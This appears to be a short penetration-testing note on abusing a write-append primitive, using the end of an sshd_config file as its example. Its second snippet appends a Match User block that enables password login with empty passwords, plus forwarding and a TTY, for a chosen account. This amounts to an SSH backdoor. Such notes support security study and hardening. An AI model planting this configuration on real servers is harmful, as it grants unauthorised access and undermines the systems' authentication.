# Append To Arbitrary File
* as root or user you can append data to a file and ...
	* fully control content
	* partially control content (eg. parts of a logfile)
	* none (empty file)

### sshd

#### Clean file ending
```
# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
```

### Messy file ending
```
# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

# We can literally just uncomment that example
# password authentication enabled for key only servers
Match User knownaccount
	X11Forwarding yes
	AllowTcpForwarding yes
	PermitTTY yes
	PasswordAuthentication yes
	PermitEmptyPasswords yes
```
